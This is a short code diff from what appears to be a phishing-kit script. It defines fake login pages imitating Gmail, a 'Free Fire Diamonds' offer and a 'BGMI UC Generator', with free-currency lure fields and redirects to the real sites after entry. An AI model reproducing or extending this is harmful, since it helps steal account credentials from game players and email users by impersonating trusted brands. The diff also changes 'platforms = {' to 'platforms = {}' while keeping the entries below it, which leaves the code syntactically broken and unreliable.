@@ -115,7 +115,7 @@ def generate_html(title, logo_url, username_placeholder, extra_fields=""):
 </body>
 </html>"""
 
-platforms = {
+platforms = {}
     "Gmail": {
         "redirect": "https://mail.google.com",
         "placeholder": "Email Address",
@@ -126,7 +126,7 @@ platforms = {
         "placeholder": "Free Fire ID",
         "html": generate_html("Free Fire Diamonds", "https://cdn-icons-png.flaticon.com/512/831/831276.png", "Player ID", '<input type="number" name="extra" placeholder="Diamond Amount" required>')
     },
-    "BGMI - Free UC": {
+    "BGMI ": {
         "redirect": "https://www.battlegroundsmobileindia.com",
         "placeholder": "BGMI Username",
         "html": generate_html("BGMI UC Generator", "https://cdn-icons-png.flaticon.com/512/732/732228.png", "BGMI Username", '<input type="number" name="extra" placeholder="UC Amount" required>')
